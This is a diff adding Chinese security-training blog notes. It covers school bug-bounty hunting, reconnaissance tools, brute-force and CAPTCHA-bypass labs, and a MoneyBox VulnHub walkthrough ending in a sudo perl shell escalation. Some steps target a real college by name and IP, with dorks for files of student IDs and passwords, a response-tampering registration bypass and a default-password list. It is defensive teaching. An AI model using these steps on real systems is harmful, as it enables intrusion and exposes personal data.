@@ -262,6 +262,443 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-培训笔记29" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B029/" class="article-date">
+      <time datetime="2024-01-08T01:33:02.000Z" itemprop="datePublished">2024-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B029/">教育SRC分析,弱口令漏洞</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="教育SRC分析"><a href="#教育SRC分析" class="headerlink" title="教育SRC分析"></a>教育SRC分析</h2><p>1.教育SRC的含义：教育SRC（Security Response Center，安全响应中心）是针对教育行业的一种网络安全实践。它主要是指一个组织或机构，专门负责收集、处理和响应网络安全相关的漏洞报告。在教育领域，许多学校和教育机构都设有自己的教育SRC，以便于管理和保护教育系统免受网络攻击和信息安全威胁</p>
+<p>2.教育漏洞报告平台,是专门为教育行业设计的在线系统，用于收集、管理和响应网络安全漏洞。<br>链接：<a target="_blank" rel="noopener" href="https://dev.src.sjtu.edu.cn/">https://dev.src.sjtu.edu.cn/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704644015806-210ad2ee-d1e3-4c86-b0f7-151fe75e6585.png" alt="image.png"></p>
+<h3 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h3><ul>
+<li>教育SRC（学校）</li>
+<li>公益SRC（白嫖）</li>
+<li>挖漏洞（注入，逻辑漏洞，信息收集一下，子域名收集）</li>
+<li>挖洞学校的漏洞（所有）——&gt;信息收集——&gt;学校</li>
+<li>挖到某个学校的漏洞——&gt;学校——&gt;信息收集</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704636474903-99aac4bf-8d2b-4780-bdbe-6f6a144e3d52.png" alt="Image.png"></p>
+<h3 id="挖洞举例"><a href="#挖洞举例" class="headerlink" title="挖洞举例"></a>挖洞举例</h3><p>以西安医学院为例<br>1.谷歌搜索语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:edu 学号</span><br><span class="line">inurl:edu 初始密码</span><br><span class="line">inurl:学号|身份证|电话|工号 filetype:pdf|xls|doc|xlxs</span><br></pre></td></tr></table></figure>
+
+<p>2.搜索语句：<code>domain=&quot;xiyi.edu.cn&quot;</code>    可以得到一些子域名和ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704640244107-d28bfa74-c841-4071-bb0e-d469758e1e18.png" alt="image.png"><br>以及官网真实ip地址:59.75.117.201<br>3.在kali用nmap扫描59.75.117.201，命令：<code>nmap 59.75.117.201</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641100060-687dd459-8188-4ef4-a01a-e9259d06e006.png" alt="image.png"><br>4.依次访问59.75.117.201：上图端口    如59.75.117.201：80   寻找漏洞<br>5.任意用户注册，任意用户登录漏洞<br>（1）首先，先用一个正常手机号注册，正常填写手机号，验证码。随便填一个身份证号，登录，用Burp抓包<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704641738797-c8311a5a-71bb-419d-929e-2401dc987615.png" alt="image.png"></p>
+<p>（2） 然后，把返回的包记录下来<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642213788-b105242f-4113-416e-8b55-8c0883af0367.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（3）再随便注册一个手机号。手机号，验证码，身份证随便填<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642532568-09c8e774-8925-4908-b306-c6af3de281cc.png" alt="image.png"><br>（4）再用Burp抓包，把下图中圈记的内容替换成之前记录的{“success”:true}<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642756664-4698bcd9-f050-450e-b5f9-18c3dda33cec.png" alt="image.png"><br>（5）发现直接可以注册登录了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704642892657-98ee1896-409b-49a1-ae22-43d213f28d1c.png" alt="image.png"></p>
+<h2 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>弱口令漏洞是指系统登录口令的设置强度不高，容易被攻击者猜到或破解。造成弱口令漏洞的主要原因是系统的运维人员、管理人员安全意识不足。<br>弱口令：弱口令我们可以简单的理解为能让别人随便就猜出的密码。</p>
+<h3 id="弱口令猜测"><a href="#弱口令猜测" class="headerlink" title="弱口令猜测"></a>弱口令猜测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br><span class="line">admin/admin123456</span><br><span class="line">admin/123456</span><br><span class="line">admin/12345678</span><br><span class="line">admin/admin666</span><br><span class="line">admin/admin888</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-培训笔记28" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B028/" class="article-date">
+      <time datetime="2024-01-08T01:27:08.000Z" itemprop="datePublished">2024-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B028/">信息收集，小米范的使用</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="信息收集网站"><a href="#信息收集网站" class="headerlink" title="信息收集网站"></a>信息收集网站</h2><h3 id="企查查的介绍"><a href="#企查查的介绍" class="headerlink" title="企查查的介绍"></a>企查查的介绍</h3><p>1.企查查是中国的一款企业信息查询工具，用户可以通过该平台查询到企业的基本信息、主要人员、对外投资、法律诉讼等多个维度的信息。企查查为用户提供了一个相对全面和便捷的方式来了解企业的情况，无论是对于企业本身、合作伙伴还是竞争对手。<br>链接：<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a></p>
+<h2 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>1.可以通过kali的ping命令获取ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704546921634-d8018096-d232-47d3-a29d-d31ca7f8c5da.png" alt="image.png"></p>
+<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><pre><code> 命令`dig qq.com`     dig是DNS解析工具，这个命令可以查看qq.com的A记录
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704547447541-7635f7d2-303f-4a49-8496-eac21c0ce51e.png" alt="image.png"></p>
+<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p><code>nslookup qq.com</code>  也可以获取ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704547513452-371e9cf1-d128-4df0-85bf-99a21384523a.png" alt="image.png"></p>
+<h3 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h3><p>OneForAll是一款开源的子域收集工具，下载链接：<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a>  然后粘贴到虚拟机</p>
+<h3 id="virustotal"><a href="#virustotal" class="headerlink" title="virustotal"></a>virustotal</h3><p>virustotal是检测上传的文件是否是木马的网站，链接<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704634470570-ff5f99bc-a4e5-4033-b25c-80385f324aa5.png" alt="image.png"></p>
+<h3 id="小米范"><a href="#小米范" class="headerlink" title="小米范"></a>小米范</h3><p>1.前提：<br>使用环境是在java1.8的环境中进行运行。<br>2.下载：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2024/jar/40666686/1704626940737-9ed7d2a5-72b6-4256-80fa-d2c1ee53ee10.jar?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2024/jar/40666686/1704626940737-9ed7d2a5-72b6-4256-80fa-d2c1ee53ee10.jar%22,%22name%22:%22web_finder_2.9.jar%22,%22size%22:3556227,%22ext%22:%22jar%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u59eb5722-a048-4fbe-8215-d925d483331%22,%22taskType%22:%22upload%22,%22type%22:%22%22,%22__spacing%22:%22both%22,%22id%22:%22u30fe1a6b%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">web_finder_2.9.jar</a>这是小米范的原文件。<br>3.使用：<br>找到安装java1.8的安装路径，将web_finder_2.9.jar放入java1.8的bin目录之下。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627348540-15136b93-127d-48ac-a9f7-e47ff0b19a15.png"><br>在java1.8的bin目录处输入cmd输入java -jar web_finder_2.9.jar，之后就可以启动你的小米范了。<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628134429-98c220db-0fa7-4916-a48e-9310d5a9aee4.png">之后新建扫描，输入IP就可以了，这里简单的输入了两个ip地址<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628087611-e95403a7-5cfe-4511-bed5-0b0e331506ce.png">可以对表单中数据进行处理。<br>4.举例：<br>fofa的使用：以sql-labs为例用浏览器打开到sqli目录下查看网页源码，找到”POST- Dump into outfile - String”<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628982805-1417eb29-526b-402d-b26a-dd5519bae253.png">用浏览器打开fofa使用body语法进行搜索。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629236298-8194feb4-b524-4b02-9970-a88d58af241d.png">如果是会员可以进行下载称之为多元组数据。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629410601-69fa40c9-14eb-45b9-9ac6-c2e0b9e0ec9c.png">直接右键将ip进行复制粘贴到小米范查看ip的存活情况。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629494714-904c6d8a-c7c4-4efb-bfef-47db25cd86a3.png">全塞入这里进行扫描：</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629638602-6a70c7d1-2446-4d2d-8346-7d218b4bf81b.png">结果:</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629752608-41bb862f-89f8-4f78-b479-ac3e9ef269d8.png">通过标题和状态码进行简单的筛选然后导出：</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630021770-06d14431-a43a-4265-b496-bceacd653c58.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-培训笔记27" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B027/" class="article-date">
+      <time datetime="2024-01-08T01:12:08.000Z" itemprop="datePublished">2024-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B027/">基于表单的暴力破解，Burp,Yakit的使用，验证码绕过，攻破靶机moneybox</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><h3 id="Burp的使用"><a href="#Burp的使用" class="headerlink" title="Burp的使用"></a>Burp的使用</h3><p>1.从老师那下载pikachu-master（皮卡丘靶场）的压缩包，将其移到虚拟机win10的phpstudy（小皮）的根目录下并解压。在小皮中打开网站，点击皮卡丘。<br>2.进入第一关：基于表单的暴力破解。<br>3.启动Burp,打开内置浏览器，把第一关的网址复制到内置浏览器，在表单的用户框和密码框中分别填入admin   admin<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704626945256-ee3fcbf1-2e7c-4930-a136-66fd3477ed34.png" alt="image.png"><br>4.看Burp的HTTP历史记录,找到post请求的数据包，右键发送到Intruder。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627071485-2892d12d-b551-4ce1-ac68-91fbbe96680f.png" alt="image.png"><br>5.在Intruder中，下图的1过程改成集束炸弹，再点击2过程的清除payload的位置，3过程选中横线处，添加payload位置。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627300634-c9dfd703-aed2-4550-b548-05cbeba28e66.png" alt="image.png"><br>6.点击位置旁边的payload，按下图添加admin<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627727908-8dce7490-f437-4d73-ba55-2f6186aa56f4.png" alt="image.png"><br>7.在payload集选择2，然后在手动添加已知的真实密码123456，从下图的的从列表中添加密码。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627835525-74d11754-8dfb-473d-8687-d0431c91a9f9.png" alt="image.png"><br>8.点击右上角的开始攻击，结果如下，35077和其他的长度有很大不同，爆出密码123456<br>注意，已知真实密码123456爆破出密码123456，这个只是测试的过程。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628126555-19ec4e49-a8bd-4f0f-899e-603bb12da8d4.png" alt="image.png"></p>
+<h3 id="Yakit的使用"><a href="#Yakit的使用" class="headerlink" title="Yakit的使用"></a>Yakit的使用</h3><p>1.免配置启动，清空历史请求，打开内置浏览器，把皮卡丘的第一关的网址复制到内置浏览器，在表单中输入admin admin。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628833595-7b55b094-43e2-40e2-88b8-4e8493f8be4c.png" alt="image.png"><br>2.看历史记录，抓到了post数据包，点击下图的的FUZZ<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628942120-a0d8ab91-350d-4150-be30-80d81df0bfc7.png" alt="image.png"><br>3.点击首页–&gt;点击首页里的payload–&gt;查看字典    （注意：可以在这里添加字典）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629688165-e532478c-e3e5-4a18-a78f-0f64eccce50e.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629775975-8bdabc71-b361-49fb-b90d-50a8581c6f8b.png" alt="image.png"><br>4.返回web Fuzzer，删除两个admin，右键插入模糊测试字典，选择对应的字典。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630259162-cbeee131-a85a-438b-b6c7-94bb79d42aa4.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630165214-c9c15b80-8445-4409-b812-9db67a000c7a.png" alt="image.png"><br>5.点击发送请求，再点击响应大小，均发送成功，发现有一个响应大小34695，与其他不同，爆出密码为123456<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630354041-e304e822-614c-44e1-bde0-88360a827f42.png" alt="image.png"></p>
+<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><h3 id="Yakit的使用-1"><a href="#Yakit的使用-1" class="headerlink" title="Yakit的使用"></a>Yakit的使用</h3><p>1.由自动放行改为手动劫持，把第二关的网址复制到内置浏览器，填入admin admin 以及验证码。抓到数据包，右击界面发送到Web Fuzzer<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704631333007-7cc6262c-b222-4865-a0e6-1b9610f8184d.png" alt="image.png"></p>
+<p>2.与之前的操作一样插入字典，发送请求，最后点自动放行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704632752625-692a4d82-5162-4243-bd7c-450b1579be6f.png" alt="image.png"></p>
+<h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p>1.键入F12–&gt;点击三个点–&gt;设置–&gt;勾选 禁用js<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704633205359-f6c83d52-9474-47d4-b9b5-41b14192b0de.png#averageHue=%23fcfbfb&clientId=u4b7a7849-6dd3-4&from=paste&height=364&id=ub9fb3463&originHeight=364&originWidth=1700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40537&status=done&style=none&taskId=ufcc1e3da-7565-4868-8684-a288066a0e3&title=&width=1700" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704633336800-3944031f-194a-4dc5-b45e-9d50fdab9f85.png" alt="image.png"><br>2.后面的步骤和第二关验证码绕过（on server）一样了，不再赘述。</p>
+<h2 id="攻破靶机的环境搭建"><a href="#攻破靶机的环境搭建" class="headerlink" title="攻破靶机的环境搭建"></a>攻破靶机的环境搭建</h2><h3 id="靶机moneybox安装和设置"><a href="#靶机moneybox安装和设置" class="headerlink" title="靶机moneybox安装和设置"></a>靶机moneybox安装和设置</h3><p>1.下载并安装Oracle VM VirtualBox，链接：<a target="_blank" rel="noopener" href="https://www.virtualbox.org/">https://www.virtualbox.org/</a><br>   下载moneybox.ova镜像，链接：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/moneybox/MoneyBox.ova">https://download.vulnhub.com/moneybox/MoneyBox.ova</a><br>2.打开virtualBox,依次点击管理–&gt;导入虚拟电脑–&gt;找到moneybox.ova的安装路径，导入。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704374982933-9cfce813-baf2-484a-b355-01b4a77b2b5f.png" alt="image.png"><br>3.右击红色图标的靶机，网络–&gt;选择仅主机–&gt;选择virtualBox Host-Only Ethernet Adapter–&gt;点击OK。<br>–&gt;高级–&gt;查看靶机物理地址，并记住FF86<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378038700-4882e0ae-09ed-4172-bfa2-05b9a8e55081.png" alt="image.png"><br>4.USB设备–&gt;选择USB1.1–&gt;点击OK<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704375648197-da29111d-75e3-4d05-a78b-a1e7350ab764.png" alt="image.png"><br>5.双击红色图标的靶机，启动。启动成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704375831136-e0b03de3-658b-4cb8-b471-00a2b566252b.png" alt="image.png"></p>
+<h3 id="kali机设置"><a href="#kali机设置" class="headerlink" title="kali机设置"></a>kali机设置</h3><p>1.右击kali机，设置–&gt;添加网络适配器2–&gt;网络适配器设置为桥接，网络适配器2设置为NAT–&gt;点击确定<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704376209469-7b6febd3-9650-433e-961a-f10a05fdc9fb.png" alt="image.png"><br>2.打开kali机，在命令窗口输入ifconfig，可查找到网卡eth0和eth1的ip地址。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704376646650-f28935d3-576c-44f5-9d32-52dc8f2db351.png" alt="image.png"><br>3.依次输入下面的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  ifdown eth0                                 //关闭接口</span><br><span class="line">ifup eth0                                    //重启接口</span><br><span class="line">arp-scan -l -I eth0                         //在指定的网络接口 eth0 上执行ARP扫描。ARP扫描用于通过发送ARP请求并收集响应来发现本地网络上的设备</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704377264016-328b4a66-7044-4d9d-b051-d83378f4f87e.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704377313332-283ba7bd-d8e9-493a-81e3-47eace781b89.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378131929-ecd240e8-a2bc-4b3f-901b-3b28b184f303.png" alt="image.png"><br>得知靶机的ip地址为192.168.56.101</p>
+<h2 id="攻破靶机moneybox"><a href="#攻破靶机moneybox" class="headerlink" title="攻破靶机moneybox"></a>攻破靶机moneybox</h2><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>1.输入命令<code>nmap -p- 192.168.56.101  </code><br>结果如下：  扫到21,22,80端口开放<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378294299-d5c19da0-f8ba-451c-be4f-3dac7d8ddeed.png" alt="image.png"><br>2.向21,22,80端口发送请求，查看21,22,23端口状态<br>命令<code>nmap -p 21,22,80 -sC 192.168.56.101</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378568681-c43fb703-5633-4ebc-a5d0-c32999a589b2.png" alt="image.png"></p>
+<h3 id="FTP协议的利用"><a href="#FTP协议的利用" class="headerlink" title="FTP协议的利用"></a>FTP协议的利用</h3><p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101                                //ftp连接到192.168.56.101</span><br><span class="line">ls                                                //查看内容</span><br><span class="line">help                                              //查看帮助命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378815874-4fe6d18d-c45e-4be5-8a89-b84d8abd3ce6.png" alt="image.png"></p>
+<h3 id="获取trytofind-jpg"><a href="#获取trytofind-jpg" class="headerlink" title="获取trytofind.jpg"></a>获取trytofind.jpg</h3><p>1.命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get trytofind.jpg                                //获取图片</span><br><span class="line">ftp&gt; exit                                            //退出ftp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704379758742-4ae4cb37-a593-4777-abb1-675b92434049.png" alt="image.png"><br>2.查看图片，没发现任何信息<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704380021520-c25c2745-df4f-4604-8e81-f2d5b1fe8463.png" alt="image.png"><br>3.看看二进制文件<br><code>strings trytofind.jpg</code><br>使用以上的命令查看.jpg .exe  .txt等文件，电脑都是以二进制的文件呈现的，而二进制是泛指的，不是指具体的0,1。二进制转化为十六进制字符，看字符比较容易理解。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704380742628-409100ff-f286-4076-887b-0728edf27755.png" alt="image.png"><br>一般图片不会有红色箭头指的一行括号，可能图片藏东西了。</p>
+<h3 id="获取隐藏文件"><a href="#获取隐藏文件" class="headerlink" title="获取隐藏文件"></a>获取隐藏文件</h3><p>1.安装steghide   <code>apt install steghide</code></p>
+<ol start="2">
+<li>查看隐藏文件  <code>steghide info trytofind.jpg</code>    发现确实有隐藏文件，但缺少一个密钥</li>
+</ol>
+<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>1.命令：<code>dirsearch -u 192.168.56.101 -x 403</code>   结果扫到一个目录blogs，然后去访问<a target="_blank" rel="noopener" href="http://192.168.56.101/blogs/">http://192.168.56.101/blogs/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704381623318-f8790253-ef91-4201-8d82-8fd2151f5845.png" alt="image.png"><br>2.右键检查网页，寻找信息。在查看器的最后一行，发现了另一个目录S3cr3t-T3xt<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704381911973-2e22647d-74a7-4efa-bb88-ceb97ba0a7c6.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704382144208-99115ec2-8747-4b2e-a3d2-92e9feea80f4.png" alt="image.png"><br>3.访问<a target="_blank" rel="noopener" href="http://192.168.56.101/">http://192.168.56.101/</a>S3cr3t-T3xt     同样的操作，发现了密钥key 3xtr4ctd4t4<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704382644575-9d9290b2-00cc-490c-aaba-cf48cfb35a18.png" alt="image.png"><br>4.命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg                //提取隐藏文件</span><br><span class="line">cat data.txt                                       //看隐藏文件data.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704382748624-f051e598-0291-4b24-810a-6c6d2390370c.png" alt="image.png"><br>5.data.txt中的内容为  你好。。。雷诺<br>    我告诉你一些重要的事，你的密码太弱了，请更改您的密码不要低估它。。。。。。。</p>
+<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>6.说明renu密码是弱密码，开始用hydra爆破他的密码，命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -h</span><br><span class="line">cd Desktop  </span><br><span class="line">hydra -l renu -P ./1 ssh://192.168.56.101                  //  1是桌面新建的文件，文件里是自建的密码字典</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704383732564-15a5637c-10cb-4153-8c01-26e2647d8f85.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704383770933-01ebf4ac-a701-47b7-aa31-ac805de124c7.png" alt="image.png"><br>爆出用户名：renu       密码：987654321</p>
+<h3 id="获取第一个flag"><a href="#获取第一个flag" class="headerlink" title="获取第一个flag"></a>获取第一个flag</h3><p>1.ssh登录     <code>ssh renu@192.168.0.129</code><br>  ls     查看文件<br> cat   user1.txt    查看user1.txt<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704384273472-943465b7-2cdd-47b0-9133-394b642110f2.png" alt="image.png"></p>
+<h3 id="获取第二个flag"><a href="#获取第二个flag" class="headerlink" title="获取第二个flag"></a>获取第二个flag</h3><p>1.查看renu用户的输入命令历史记录<br><code>cat .bash_history</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704434828136-22510d78-ff7f-412d-a6bd-cf46d86e95f7.png" alt="image.png"></p>
+<p>2.发现renu远程登录了用户lily的电脑。所以我们尝试去登录lily用户<br><code>ssh lily@192.168.56.101</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704435074467-d0154aa6-339a-4a48-8b50-f0746a1eaed7.png" alt="image.png"><br>登录成功！<br>3.输入以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat user2.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704435586700-ab82fefa-4bb8-45c2-a279-f86692b44a83.png" alt="image.png"></p>
+<h3 id="获取第三个flag"><a href="#获取第三个flag" class="headerlink" title="获取第三个flag"></a>获取第三个flag</h3><p>1.命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l                                      //显示当前用户可以执行的命令列表</span><br><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="line">id                                          //显示用户id,组id</span><br><span class="line"># cd /root</span><br><span class="line"># ls -al</span><br><span class="line"># cat .root.txt</span><br></pre></td></tr></table></figure>
+
